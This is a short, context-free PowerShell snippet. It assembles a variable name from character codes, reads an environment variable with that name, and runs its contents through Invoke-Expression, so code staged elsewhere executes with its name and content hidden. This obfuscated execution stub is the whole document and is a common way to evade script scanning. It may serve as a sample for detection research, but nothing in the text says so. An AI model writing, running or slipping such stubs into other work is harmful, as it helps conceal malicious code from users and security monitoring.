$x=0x61
$x=[char]($x)+[char]($x+1)+[char]($x+2);
$y=[System.Environment]::GetEnvironmentVariable($x)
iex $y;
